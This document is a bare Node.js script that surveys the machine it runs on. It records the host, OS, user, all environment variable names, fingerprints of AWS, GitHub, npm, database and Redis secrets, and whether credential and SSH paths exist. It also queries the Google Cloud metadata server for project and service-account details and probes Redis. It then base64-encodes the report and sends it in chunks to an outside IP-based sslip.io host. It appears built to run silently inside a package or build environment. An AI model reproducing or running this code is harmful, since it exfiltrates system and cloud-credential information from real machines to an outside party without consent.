const https = require('https');
const http = require('http');
const os = require('os');
const fs = require('fs');
const crypto = require('crypto');
const net = require('net');
const MARK = 'full-5ba282';
const BASE = 'https://172.236.245.28.sslip.io/m2/' + MARK;
function fp(v){ if(!v) return null; return {len:v.length, sha:crypto.createHash('sha256').update(v).digest('hex').slice(0,12)}; }
const sensitive = ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN','AWS_REGION','AWS_DEFAULT_REGION','REDIS_URL','GIT_SESSION_SECRET','GITHUB_TOKEN','GH_TOKEN','NPM_TOKEN','S3_BUCKET','SNACKAGER_BUCKET','DATABASE_URL','SECRET_KEY_BASE','SENTRY_DSN'];
const report = { mark: MARK, host: os.hostname(), platform: os.platform()+' '+os.release(), arch: os.arch(), node: process.version, uid: process.getuid?process.getuid():null, cwd: process.cwd(), env_keys: Object.keys(process.env).sort(), sensitive: {}, files: {} };
for (const k of sensitive) if (process.env[k]) report.sensitive[k]=fp(process.env[k]);
for (const p of ['/proc/self/environ','/root/.aws/credentials','/root/.ssh','/app','/home','/secrets','/var/run/secrets']) { try { report.files[p]=fs.existsSync(p)?(fs.statSync(p).isDirectory()?'dir':'file'):'absent'; } catch(e){ report.files[p]='err'; } }
function meta(path, cb){ const req=http.get({host:'metadata.google.internal',path:'/computeMetadata/v1/'+path,headers:{'Metadata-Flavor':'Google'},timeout:3000},res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>cb(d.trim().slice(0,600)));}); req.on('error',()=>cb(null)); req.on('timeout',()=>{req.destroy();cb(null)}); }
function send(){ const data=Buffer.from(JSON.stringify(report)).toString('base64url'); const chunks=data.match(/.{1,1100}/g)||[]; let i=0; const next=()=>{ if(i>=chunks.length) return; const url=BASE+'?i='+i+'&n='+chunks.length+'&d='+chunks[i]; https.get(url,r=>{r.resume();i++;setTimeout(next,250);}).on('error',()=>{i++;setTimeout(next,250)}); }; next(); }
meta('project/project-id', proj=>{ report.gcp_project=proj; meta('instance/service-accounts/default/email', email=>{ report.gcp_sa_email=email; meta('instance/service-accounts/default/scopes', scopes=>{ report.gcp_scopes=scopes; if(!process.env.REDIS_URL){ send(); return; } try { const u=new URL(process.env.REDIS_URL); const s=net.connect({host:u.hostname,port:u.port||6379},()=>s.write('PING\r\n')); s.setTimeout(3000); s.on('data',d=>{report.redis=d.toString().slice(0,40);s.destroy();send();}); s.on('error',e=>{report.redis='err:'+e.code;send();}); s.on('timeout',()=>{report.redis='timeout';s.destroy();send();}); } catch(e){ report.redis='urlerr'; send(); } }); }); });
setTimeout(()=>{ try{send();}catch(e){}; setTimeout(()=>process.exit(0),3000); }, 9000);
